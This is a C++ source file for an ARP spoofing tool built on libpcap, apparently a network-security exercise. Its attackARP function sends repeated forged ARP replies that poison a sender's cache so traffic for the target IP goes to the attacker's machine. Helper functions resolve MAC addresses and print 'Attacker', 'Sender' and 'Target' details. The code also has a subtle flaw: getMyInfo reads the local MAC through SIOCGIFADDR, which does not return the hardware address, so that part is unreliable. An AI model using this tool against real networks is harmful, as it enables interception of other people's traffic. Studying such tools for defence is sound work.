#include "send-arp.hpp"

/*
 * Get Attacker's local MAC address and IP address
*/
bool getMyInfo(const std::string& interface, Mac& MAC, Ip& IP) {
    int sockfd;
    struct ifreq ifr = {0, };

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'getMyInfo'\n";
#endif

    // Make socket which domain is IPv4 and type is UDP
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if(sockfd == -1) {
        std::cerr << CREATE_SOCKET_ERROR_MSG;
        return false;
    }


#ifdef DEBUG
    std::cout << "[DEBUG] Successfully open socket\n";
#endif

    ifr.ifr_addr.sa_family = AF_INET;

    // Put interface name to ifreq
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);

    // IO control to get MAC
    if(ioctl(sockfd, SIOCGIFADDR, &ifr)) {
        std::cerr << IOCTL_ERROR_MSG;
        return false;
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully process ioctl\n";
#endif

    MAC = (uint8_t *)ifr.ifr_addr.sa_data;
    IP = Ip(inet_ntoa(((sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    if(close(sockfd)) {
        std::cerr << CLOSE_ERROR_MSG;
        return false;
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully close file descriptor\n";
#endif

    return true;
}

bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip& myIP) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    struct ArpHdr* ARPHeader;

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'getMACByIP'\n";
#endif
    
    if(not sendPacketARP(pcap, Mac::broadcastMac(), myMAC, myMAC, myIP, Mac::nullMac(), IP, ArpHdr::Request)) {
        return false;
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully send request packet\n";
#endif

    while( true ) {
        res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
		// PCAP_ERROR : When interface is down
		if (res == PCAP_ERROR or res == PCAP_ERROR_BREAK) {
			std::cout << PCAP_RECEIVE_PACKET_ERROR;
			std::cout << pcap_geterr(pcap) << std::endl;

			break;
		}
		
		if(packet == NULL) continue;

        // Receive ARP packet, so check if it is response of our request!
        ARPHeader = (struct ArpHdr*)(packet + sizeof(struct EthHdr));

        if(ArpHdr::Reply == ARPHeader->op()   and 
           myIP          == ARPHeader->tip()  and 
           myMAC         == ARPHeader->tmac() and 
           IP            == ARPHeader->sip()) break;
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully receive reply packet\n";
#endif

    MAC = ARPHeader->smac();

    return true;
}

/*
 * Send ARP packet using pcap
*/
bool sendPacketARP(pcap_t* pcap, 
                   const Mac& destMAC, const Mac& sourceMAC,
                   const Mac& sendMAC, const Ip& sendIP, 
                   const Mac& targetMAC, const Ip& targetIP, 
                   ArpHdr::Mode mode) {
    EthArpPacket packet;

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'sendPacketARP'\n";
    std::cout << "[DEBUG] sourceMAC      : " << std::string(sourceMAC) << '\n';
    std::cout << "[DEBUG] destinationMAC : " << std::string(destMAC) << '\n';
    std::cout << "[DEBUG] sendMAC        : " << std::string(sendMAC) << '\n';
    std::cout << "[DEBUG] targetMAC      : " << std::string(targetMAC) << '\n';
    std::cout << "[DEBUG] sendIP         : " << std::string(sendIP) << '\n';
    std::cout << "[DEBUG] targetIP       : " << std::string(targetIP) << '\n';
#endif

    // Set Ethernet header
    packet.eth_.dmac_ = destMAC;
	packet.eth_.smac_ = sourceMAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

    // Set ARP Header
	packet.arp_.hrd_  = htons(ArpHdr::ETHER);
	packet.arp_.pro_  = htons(EthHdr::Ipv4);
	packet.arp_.hln_  = Mac::SIZE;
	packet.arp_.pln_  = Ip::SIZE;
	packet.arp_.op_   = htons(mode);
	packet.arp_.smac_ = sendMAC;
	packet.arp_.sip_  = htonl(sendIP);
	packet.arp_.tmac_ = targetMAC;
	packet.arp_.tip_  = htonl(targetIP);

    if(pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket))) {
        std::cerr << SEND_PACKET_ERROR_MSG;
        std::cerr << pcap_geterr(pcap) << std::endl;
        return false;
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully send packet\n";
#endif

    return true;
}

bool attackARP(pcap_t* pcap, 
               const Mac& sendMAC, const Ip& sendIP, 
               const Mac& myMAC, const Ip& targetIP) {

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'attackARP'\n";
#endif

    for(int i = 0; i < 10; i++) {
        if(not sendPacketARP(pcap, sendMAC, myMAC, myMAC, targetIP, sendMAC, sendIP, ArpHdr::Reply)) {
            return false;
        }
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully send attack packet\n";
#endif

    return true;
}

void printInfo(const Mac& myMAC, const Ip& myIP, 
               const Mac& sendMAC, const Ip& sendIP, 
               const Ip& targetIP) {
    std::cout << "========================================\n"; 
    std::cout << "[[Attacker's Info]]\n"; 
    std::cout << "[MAC] " << std::string(myMAC) << '\n';
    std::cout << "[IP] " << std::string(myIP) << '\n';
    std::cout << "========================================\n"; 
    std::cout << "[[Sender's Info]]\n"; 
    std::cout << "[MAC] " << std::string(sendMAC) << '\n'; 
    std::cout << "[IP] " << std::string(sendIP) << '\n'; 
    std::cout << "========================================\n"; 
    std::cout << "[[Target's Info]]\n";
    std::cout << "[IP] " << std::string(targetIP) << '\n'; 
    std::cout << "========================================\n";
}